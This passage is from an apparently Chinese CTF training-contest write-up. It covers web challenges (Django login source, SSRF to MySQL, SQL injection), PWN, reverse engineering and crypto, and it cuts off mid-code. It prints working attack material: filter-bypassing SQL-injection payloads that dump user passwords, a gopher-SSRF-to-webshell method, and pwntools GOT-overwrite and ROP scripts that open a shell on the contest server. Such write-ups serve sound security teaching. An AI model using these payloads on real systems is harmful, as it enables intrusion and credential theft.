class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> serializers</span><br><span class="line"><span class="keyword">from</span> rest_framework.status <span class="keyword">import</span> HTTP_404_NOT_FOUND</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> CaptchaStore, IPStore</span><br><span class="line"><span class="keyword">from</span> .util <span class="keyword">import</span> Captcha</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestSerializers</span><span class="params">(serializers.Serializer)</span>:</span></span><br><span class="line">    uuid = serializers.CharField(required=<span class="literal">True</span>)</span><br><span class="line">    code = serializers.CharField(required=<span class="literal">False</span>, allow_blank=<span class="literal">True</span>)</span><br><span class="line">    password = serializers.CharField(required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, ip_store)</span>:</span></span><br><span class="line">        attrs = self.validated_data</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c = CaptchaStore.objects.get(uuid=attrs[<span class="string">"uuid"</span>])</span><br><span class="line">            <span class="keyword">if</span> ip_store.need_captcha() <span class="keyword">and</span> c.data != attrs[<span class="string">"code"</span>]:</span><br><span class="line">                c.delete()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">"验证码错误"</span></span><br><span class="line">            print(attrs[<span class="string">"password"</span>])</span><br><span class="line">            <span class="keyword">if</span> attrs[<span class="string">"password"</span>] != <span class="string">"312"</span>:</span><br><span class="line">                c.delete()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">"密码错误"</span></span><br><span class="line">            c.delete()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">"flag&#123;do_you_like_react_and_webpack&#125;"</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">"uuid不存在"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        <span class="comment"># IP 检测</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"HTTP_X_REAL_IP"</span> <span class="keyword">in</span> request.META:</span><br><span class="line">            ip = request.META[<span class="string">'HTTP_X_REAL_IP'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = request.META[<span class="string">'REMOTE_ADDR'</span>]</span><br><span class="line">        uuid = str(uuid4()).replace(<span class="string">"-"</span>, <span class="string">""</span>)</span><br><span class="line">        ip_md5 = hashlib.md5(ip.encode()).hexdigest()</span><br><span class="line">        ip_store, _ = IPStore.objects.get_or_create(ip=ip_md5)</span><br><span class="line">        image_str = <span class="string">""</span></span><br><span class="line">        v = <span class="string">"0000"</span></span><br><span class="line">        <span class="keyword">if</span> ip_store.try_num &gt; <span class="number">2</span>:</span><br><span class="line">            image_str, v = Captcha().get()</span><br><span class="line">        CaptchaStore.objects.create(uuid=uuid, data=v)</span><br><span class="line">        uuid_bytes = list(uuid.encode())</span><br><span class="line">        key_byte = list(<span class="string">"123C7E5E875FBF0EEE2583F8AF3DDFF9"</span>.encode())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(uuid_bytes)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(key_byte)):</span><br><span class="line">                uuid_bytes[i] ^= key_byte[j]</span><br><span class="line">        s = base64.b64encode(bytes(uuid_bytes)).decode()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">"img"</span>: image_str,</span><br><span class="line">            <span class="string">"uuid"</span>: s</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        se = TestSerializers(data=request.data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"HTTP_X_REAL_IP"</span> <span class="keyword">in</span> request.META:</span><br><span class="line">            ip = request.META[<span class="string">'HTTP_X_REAL_IP'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = request.META[<span class="string">'REMOTE_ADDR'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip_md5 = hashlib.md5(ip.encode()).hexdigest()</span><br><span class="line">            ip_store = IPStore.objects.get(ip=ip_md5)</span><br><span class="line">            ip_store.add_visit_num()</span><br><span class="line">            <span class="keyword">if</span> ip_store.need_ban():</span><br><span class="line">                <span class="keyword">return</span> Response(status=HTTP_404_NOT_FOUND)</span><br><span class="line">            <span class="keyword">if</span> se.is_valid():</span><br><span class="line">                s, data = se.save(ip_store)</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;<span class="string">"result"</span>: s, <span class="string">"msg"</span>: data&#125;)</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;<span class="string">"result"</span>: <span class="literal">False</span>, <span class="string">"msg"</span>: <span class="string">"表单错误"</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            <span class="keyword">return</span> Response(status=HTTP_404_NOT_FOUND)</span><br></pre></td></tr></table></figure><h6 id="utils-py"><a href="#utils-py" class="headerlink" title="utils.py"></a>utils.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Captcha</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.random_number = <span class="string">""</span>.join([str(j) <span class="keyword">for</span> j <span class="keyword">in</span> [random.choice(list(range(<span class="number">10</span>))) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)]])</span><br><span class="line">        self.color = [(random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        weight = <span class="number">63</span></span><br><span class="line">        height = <span class="number">24</span></span><br><span class="line">        image = Image.new(<span class="string">'RGB'</span>, (weight, height), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        font = ImageFont.truetype(font=<span class="string">"C:/309.ttf"</span>, size=<span class="number">25</span>)</span><br><span class="line">        draw = ImageDraw.Draw(image)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(weight):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">                draw.point((x, y), fill=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        offset = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> number, color <span class="keyword">in</span> zip(self.random_number, self.color):</span><br><span class="line">            draw.text((offset * <span class="number">15</span> + <span class="number">5</span>, <span class="number">0</span>), str(number), font=font, fill=color)</span><br><span class="line">            offset += <span class="number">1</span></span><br><span class="line">        buffered = BytesIO()</span><br><span class="line">        image.save(buffered, format=<span class="string">"PNG"</span>)</span><br><span class="line">        img_str = base64.b64encode(buffered.getvalue()).decode()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"data:image/png;base64,"</span> + img_str, self.random_number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    i, n = Captcha().get()</span><br><span class="line">    print(i, n)</span><br></pre></td></tr></table></figure><h6 id="models-py"><a href="#models-py" class="headerlink" title="models.py"></a>models.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CaptchaStore</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    uuid = models.CharField(max_length=<span class="number">30</span>)</span><br><span class="line">    data = models.CharField(max_length=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IPStore</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    ip = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    try_num = models.IntegerField(default=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_visit_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.try_num += <span class="number">1</span></span><br><span class="line">        self.save(update_fields=[<span class="string">"try_num"</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">need_captcha</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.try_num &gt; <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">need_ban</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.try_num &gt; <span class="number">50</span></span><br></pre></td></tr></table></figure><h3 id="这个跳板怎么样"><a href="#这个跳板怎么样" class="headerlink" title="这个跳板怎么样"></a>这个跳板怎么样</h3><p>主要涉及知识点：</p><p>通过SSRF，访问未授权Mysql数据库，写入Webshell</p><p>打开网页，F12发现提示”白蜘蛛”，访问robots.txt</p><p>拿到有关内网数据库的一些信息（包括账号，库名，表名，字段名）</p><p>SSRF访问未授权MySql数据，可以参考这篇文章：</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/103026470</a></p><p>（主要是通过gopher协议，发送TCP数据）</p><p>页面输入一些网站，发现是可以访问的。（ban掉了dict和file）</p><p>使用gopher协议直接发送数据包，访问未授权MySql，在hint字段里面查看到网站的根目录信息。</p><p>接下来两种思路：</p><ol><li>直接load_file根目录下的flag文件</li><li>通过into outfile向根目录写入webshell，蚁剑访问，拿到flag</li></ol><h3 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h3><p>很简单的SQL注入，B站也有视频，不多说</p><p>直接上payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,database()# &#x2F;&#x2F;爆库</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;inforinformationmation_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;&#39;exercise&#39;# &#x2F;爆表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;inforinformationmation_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;# 爆字段</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,group_concat(username)&#x2F;**&#x2F;from&#x2F;**&#x2F;users# &#x2F;爆值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users# &#x2F;爆值</span><br></pre></td></tr></table></figure><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x00-Command"><a href="#0x00-Command" class="headerlink" title="0x00.Command"></a>0x00.Command</h3><p>​        在Ubuntu终端执行命令来远程运行程序。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10000</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/20/U4w2OP.png" alt=""></p><p>​        提示我们输入命令，估计是linux命令。</p><p>​        二话不说把文件丢入IDA分析，主函数如下：</p><p><img src="https://s1.ax1x.com/2020/07/20/U4w5Fg.png" alt=""></p><p>​        程序大意是让用户输入一个字符串，并且将这个字符串当作linux命令执行，因此我们直接执行”/bin/sh”即可控制远程终端，然后再执行cat flag.txt，即可拿到flag值：flag{aa2ff3bc-88e7-4b08-89b0-3e93a445c5d7}</p><p><img src="https://s1.ax1x.com/2020/07/20/U4wfw8.png" alt=""></p><h3 id="0x01-Command-2"><a href="#0x01-Command-2" class="headerlink" title="0x01.Command 2"></a>0x01.Command 2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10000</span><br></pre></td></tr></table></figure><p>​        这题和上题差不多，都是输入命令然后执行。</p><p><img src="https://s1.ax1x.com/2020/07/20/U4whTS.png" alt=""></p><p>​        不同的是，这次输入的命令长度限制为2字节。</p><p>​        我们可以想到用$0命令来重启终端，相当于执行了/bin/sh。</p><p><img src="https://s1.ax1x.com/2020/07/20/U4wWef.png" alt=""></p><p>​        <a href="https://blog.csdn.net/helloxiaozhe/article/details/80940066" target="_blank" rel="noopener">参考博客</a>。</p><h3 id="0x02-pwntools"><a href="#0x02-pwntools" class="headerlink" title="0x02.pwntools"></a>0x02.pwntools</h3><p><img src="https://img-blog.csdnimg.cn/20200719180752219.png" alt="在这里插入图片描述"><br>        nc之后说flag藏在了里面，下pwntools即可拿到flag，想到了pwntools的recv可以显示出被\r隐藏的句子</p><p><img src="https://img-blog.csdnimg.cn/20200719181608918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>        把\n和\r之间的字符串base64解码即可。</p><h3 id="0x03-miss-some"><a href="#0x03-miss-some" class="headerlink" title="0x03.miss_some"></a>0x03.miss_some</h3><p><img src="https://s1.ax1x.com/2020/07/20/U4wIYQ.png" alt=""></p><p>​        让我们输入想要的。。。不知所云。</p><p>​        丢ida瞅瞅：</p><p><img src="https://s1.ax1x.com/2020/07/20/U4woWj.png" alt=""></p><p>​        主函数有俩scanf，一个有&amp;，一个没有。也就是说，我们第一次输入值，会被当成下一次输入的目标地址。比如说第一次输入0x08048052这个地址，那buf变量就保存了这个地址，第二次输入的时候，由于没有&amp;，所以scanf就会把v4变量里的值当成地址，进而让用户对0x08048052地址进行输入。</p><p>​        除此之外我们还注意到，程序中运用到了system函数，而且两个scanf函数之后，发现puts(“/bin/sh”);的代码。这里我们只要将puts的函数地址，改写成system的函数地址，那么系统在执行puts(“/bin/sh”);的时候就会执行system(“/bin/sh”);</p><p>​        要了解如何修改函数调用地址，需要了解<a href="https://blog.csdn.net/mylyylmy/article/details/79954581" target="_blank" rel="noopener">got表以及got表的覆写技术</a>。这里只大致解释一下：ELF文件中，用一个表，got(全局偏移表)表，来记录整个程序用到的全局函数名(标识符)及其地址。当程序需要调用函数的时候，就去got表搜这个函数的地址。每个函数第一次被调用时，系统还会将got表重定向到plt表(过程连接表)中，使其根据函数一一对应。所以最终调用的还是plt表里的地址。</p><p>​        因此我们只要向puts的got表中写入system在plt表中的值，即可拿flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">"./miss_some"</span>)</span><br><span class="line">puts_addr = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(str(puts_addr))<span class="comment">#因为scanf中限定的格式化字符串为“%d”，因此我们只能输入十进制数</span></span><br><span class="line">p.sendline(str(system_addr))<span class="comment">#str()会将十进制的地址转成字符串输出，和终端的输入效果相同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> str(puts_addr)</span><br><span class="line"><span class="keyword">print</span> str(puts_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/20/U4wHln.png" alt=""></p><h3 id="0x04-ROP"><a href="#0x04-ROP" class="headerlink" title="0x04.ROP"></a>0x04.ROP</h3><p>​        rop老套路了。</p><p><img src="https://img-blog.csdnimg.cn/20200719191002377.png" alt=""><br>        IDA中shift+F12</p><p><img src="https://img-blog.csdnimg.cn/20200719191930322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt=""><br>双击查看/bin/sh的地址</p><p><img src="https://img-blog.csdnimg.cn/2020071919195647.png" alt=""><br>双击查看system的地址</p><p><img src="https://img-blog.csdnimg.cn/20200719193036278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt=""><br>计算偏移量</p><p><img src="https://img-blog.csdnimg.cn/20200719193341909.png" alt=""><br><img src="https://img-blog.csdnimg.cn/20200719193401535.png" alt=""></p><p>0x4-(-0x38)=60</p><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./rop')</span></span><br><span class="line">sh=remote(<span class="string">'121.41.113.245'</span>,<span class="number">10003</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08049a20</span></span><br><span class="line">system_plt = <span class="number">0x080483D0</span></span><br><span class="line">payload = flat([<span class="string">'a'</span> * <span class="number">60</span>, system_plt, <span class="string">'b'</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p><p><img src="https://img-blog.csdnimg.cn/20200719193621879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="0x00-不会有人看不懂c吧"><a href="#0x00-不会有人看不懂c吧" class="headerlink" title="0x00 . 不会有人看不懂c吧"></a>0x00 . 不会有人看不懂c吧</h3><p>​        顾名思义，这是和c相关的逆向，可以直接扔进ida分析程序</p><p>​        程序逻辑也一目了然，简单来说就是，将你的输入与num数组中存在的位置异或，然后放到该位置，最后与程序中存在的数据进行比较，全部一样，则判定为正确的flag。</p><p>​        所以逆向脚本也很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">125</span>,<span class="number">94</span>,<span class="number">108</span>,<span class="number">48</span>,<span class="number">126</span>,</span><br><span class="line">    <span class="number">104</span>,<span class="number">114</span>,<span class="number">124</span>,<span class="number">41</span>,<span class="number">111</span>,</span><br><span class="line">    <span class="number">102</span>,<span class="number">62</span>,<span class="number">60</span>,<span class="number">82</span>,<span class="number">107</span>,</span><br><span class="line">    <span class="number">110</span>,<span class="number">98</span>,<span class="number">103</span>,<span class="number">119</span>,<span class="number">36</span>,</span><br><span class="line">    <span class="number">124</span>,<span class="number">116</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">118</span>,</span><br><span class="line">    <span class="number">70</span>,<span class="number">127</span>,<span class="number">68</span>,<span class="number">110</span>]</span><br><span class="line">b=[<span class="number">9</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">7</span>,</span><br><span class="line">    <span class="number">24</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">16</span>,</span><br><span class="line">    <span class="number">3</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">28</span>,<span class="number">11</span>,</span><br><span class="line">    <span class="number">18</span>,<span class="number">27</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">13</span>,</span><br><span class="line">    <span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">25</span>,</span><br><span class="line">    <span class="number">5</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">0</span>]</span><br><span class="line">c=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">29</span>):</span><br><span class="line">c+=chr(a[b[i]]^b[i])</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p>flag{n0t_r3ver5e_ez_7han_me!}</p><h3 id="0x01-没老师教，惨惨"><a href="#0x01-没老师教，惨惨" class="headerlink" title="0x01 . 没老师教，惨惨"></a>0x01 . 没老师教，惨惨</h3><p>​        其实题目名和提示都是表示，用来写出这个exe程序的代码是没老师教的</p><p>​        结合我们的日常使用以及分析程序，很容易想到是python代码</p><p>​        例如使用ida查看字符串，有大量py开头的字符</p><p>​        最常见的py打包方法是py2exe和pyinstaller，这里我使用的是pyinstaller</p><p>​        搜索如何反编译pyinstaller可得pyinstaller自带archive_viewer可以反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PyInstaller.utils.cliutils.archive_viewer <span class="keyword">import</span> run</span><br><span class="line">run()</span><br></pre></td></tr></table></figure><p>​        这个脚本的可用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">U: go Up one level</span><br><span class="line">O &lt;name&gt;: open embedded archive name</span><br><span class="line">X &lt;name&gt;: extract name</span><br><span class="line">Q: quit</span><br></pre></td></tr></table></figure><p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-3-1.png" alt=""></p><p>​        我们使用x test，来提取test文件，可以得到.pyc文件</p><p>​        但需要注意的是这个提取出来的pyc可能会缺少文件头，补上即可</p><p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-3-2.png" alt=""></p><p>​        再扔进反编译工具可得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Str = <span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">Str += raw_input()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(Str)):</span><br><span class="line">    <span class="keyword">if</span> Str[i] <span class="keyword">in</span> (<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>):</span><br><span class="line">        flag += chr(ord(Str[i]) - <span class="number">23</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(ord(Str[i]) + <span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>​        容易看出是凯撒加密密码，但是还是没有flag，为什么呢</p><p>​        是因为出题人太菜了呜呜呜</p><p>​        以为python编译后是保留注释的，其实只保留‘’‘因为这算字符串’‘’，不保留#</p><p>​        也就是说没有了</p><p>​        # Str = zxeedoxeedgxegxe</p><p>​        最后的flag应该是 flag{wubbalubbadubdub}</p><p>​        咚咚咚，dbq大家</p><p><img src="https://s1.ax1x.com/2020/07/20/U4wxkF.gif" alt=""></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x00-pig🐖"><a href="#0x00-pig🐖" class="headerlink" title="0x00 . pig🐖"></a>0x00 . pig🐖</h3><p>​        根据题目知道是<a href="https://www.cnblogs.com/Yuuki-/p/7897171.html" target="_blank" rel="noopener">猪圈密码</a>。</p><p>​        解出来是：eatalldaysleepallnight</p><h3 id="REPLACE"><a href="#REPLACE" class="headerlink" title="REPLACE"></a>REPLACE</h3><p>简单的替换密码（找规律）</p><p>明文的每个字母都对应密文里某个特定的字母</p><p>（最后少的两个随意组合一下就行）</p><h3 id="梨son对数"><a href="#梨son对数" class="headerlink" title="梨son对数"></a>梨son对数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 